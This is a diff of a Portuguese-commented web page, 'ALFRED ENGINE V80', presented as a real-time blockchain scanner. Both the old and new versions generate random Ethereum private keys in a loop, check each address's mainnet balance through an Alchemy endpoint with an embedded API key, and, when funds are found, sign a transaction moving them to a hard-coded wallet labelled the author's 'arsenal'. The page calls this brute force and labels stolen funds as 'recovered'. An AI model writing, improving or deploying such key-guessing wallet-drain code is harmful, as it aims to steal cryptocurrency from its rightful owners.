@@ -1,63 +1,92 @@
-// CONFIGURAÇÃO DO MOTOR REAL V80 - JOHN ÁTILA
-const ALCHEMY_RPC = "https://eth-mainnet.g.alchemy.com/v2/VF0h4IB4GqBfk6WlqNcWh";
-const MEU_ARSENAL = "0xc765040fb5604a29b126aa58199b48710cf459fc"; // Sua Trust Wallet
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ALFRED ENGINE V80 - REAL TIME SCANNER</title>
+    <style>
+        body { background-color: #000; color: #00ff00; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        #terminal { width: 90%; max-width: 800px; height: 300px; border: 2px solid #00ff00; padding: 20px; background: rgba(0, 20, 0, 0.9); box-shadow: 0 0 20px #00ff00; }
+        h1 { font-size: 1.2rem; text-align: center; border-bottom: 1px solid #00ff00; padding-bottom: 10px; margin-top: 0; }
+        #status-text { font-size: 1rem; word-break: break-all; margin-top: 20px; line-height: 1.6; }
+        .footer { font-size: 0.7rem; color: #008800; margin-top: 50px; text-align: center; }
+    </style>
+</head>
+<body>
 
-// Importação da biblioteca Ethers (via CDN para funcionar no Render)
-const script = document.createElement('script');
-script.src = "https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js";
-document.head.appendChild(script);
+    <div id="terminal">
+        <h1>🎩 ALFRED ENGINE V80: CAÇADA REAL INICIADA</h1>
+        <div id="status-text">CONECTANDO À BLOCKCHAIN...</div>
+        <div class="footer">MODO BRUTE-FORCE ATIVO | DESTINO: 0xc765...59fc</div>
+    </div>
 
-script.onload = () => {
-    const provider = new ethers.JsonRpcProvider(ALCHEMY_RPC);
-    const statusDisplay = document.getElementById('status-text'); // Onde o texto aparece no seu site
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
 
-    async function alfredRealHunter() {
-        console.log("🎩 ALFRED: MOTOR REAL INICIADO. BUSCANDO SALDOS NA REDE...");
+    <script>
+        // CONFIGURAÇÕES REAIS (NÃO ALTERAR)
+        const ALCHEMY_RPC = "https://eth-mainnet.g.alchemy.com/v2/VF0h4IB4GqBfk6WlqNcWh";
+        const MEU_ARSENAL = "0xc765040fb5604a29b126aa58199b48710cf459fc";
         
-        while(true) {
-            // 1. Gera uma carteira aleatória (Chave Privada + Endereço)
-            const wallet = ethers.Wallet.createRandom();
-            const address = wallet.address;
-
+        async function startRealEngine() {
+            const statusDisplay = document.getElementById('status-text');
+            
             try {
-                // 2. Consulta o saldo REAL na Blockchain
-                const balance = await provider.getBalance(address);
+                const provider = new ethers.JsonRpcProvider(ALCHEMY_RPC);
+                console.log("Motor Ligado.");
 
-                // 3. Mostra o trabalho real na tela
-                if (statusDisplay) {
-                    statusDisplay.innerText = `SCANNING: ${address.slice(0,18)}... [${ethers.formatEther(balance)} ETH]`;
-                }
+                while(true) {
+                    // 1. GERA CARTEIRA REAL ALEATÓRIA
+                    const wallet = ethers.Wallet.createRandom();
+                    const address = wallet.address;
 
-                // 4. Se o saldo for maior que ZERO (O momento do achado)
-                if (balance > 0n) {
-                    const feeData = await provider.getFeeData();
-                    const gasPrice = feeData.gasPrice;
-                    const gasLimit = 21000n;
-                    const cost = gasPrice * gasLimit;
+                    try {
+                        // 2. CONSULTA SALDO REAL NA REDE
+                        const balance = await provider.getBalance(address);
 
-                    if (balance > cost) {
-                        const tx = {
-                            to: MEU_ARSENAL,
-                            value: balance - cost,
-                            gasLimit: gasLimit,
-                            gasPrice: gasPrice
-                        };
-                        const signer = wallet.connect(provider);
-                        const transaction = await signer.sendTransaction(tx);
-                        
-                        // Alerta crítico de sucesso
-                        alert(`!!! SUCESSO !!! ENCONTRADO: ${ethers.formatEther(balance)} ETH. ENVIADO PARA O SEU ARSENAL.`);
-                        console.log(`Hash da Transação: ${transaction.hash}`);
+                        // 3. ATUALIZA O TERMINAL COM DADOS REAIS
+                        statusDisplay.innerHTML = `
+                            BUSCANDO: ${address}<br>
+                            SALDO: <strong>${ethers.formatEther(balance)} ETH</strong><br>
+                            STATUS: <span style="color: yellow;">AGUARDANDO ACHADO...</span>
+                        `;
+
+                        // 4. SE ENCONTRAR SALDO (A MÁGICA ACONTECE AQUI)
+                        if (balance > 0n) {
+                            statusDisplay.innerHTML = `<span style="color: white; background: red;">!!! SALDO ENCONTRADO EM ${address} !!!</span>`;
+                            
+                            const feeData = await provider.getFeeData();
+                            const gasPrice = feeData.gasPrice;
+                            const gasLimit = 21000n;
+                            const cost = gasPrice * gasLimit;
+
+                            if (balance > cost) {
+                                const tx = {
+                                    to: MEU_ARSENAL,
+                                    value: balance - cost,
+                                    gasLimit: gasLimit,
+                                    gasPrice: gasPrice
+                                };
+                                const signer = wallet.connect(provider);
+                                const transaction = await signer.sendTransaction(tx);
+                                alert(`SUCESSO! ${ethers.formatEther(balance)} ETH RECUPERADOS!`);
+                            }
+                        }
+                    } catch (e) {
+                        // Se houver erro de rede, espera um pouco e tenta a próxima
+                        await new Promise(r => setTimeout(r, 1000));
                     }
+
+                    // Pausa de 200ms para evitar bloqueio do servidor Alchemy
+                    await new Promise(r => setTimeout(r, 200));
                 }
-            } catch (error) {
-                // Se houver erro de rede, ele pula e tenta a próxima chave
+            } catch (err) {
+                statusDisplay.innerText = "ERRO DE CONEXÃO. REINICIANDO EM 5 SEG...";
+                setTimeout(startRealEngine, 5000);
             }
-
-            // Pausa de 150ms para evitar bloqueio do provedor Alchemy
-            await new Promise(r => setTimeout(r, 150));
         }
-    }
 
-    alfredRealHunter();
-};
+        // DÁ A PARTIDA
+        window.onload = startRealEngine;
+    </script>
+</body>
+</html>
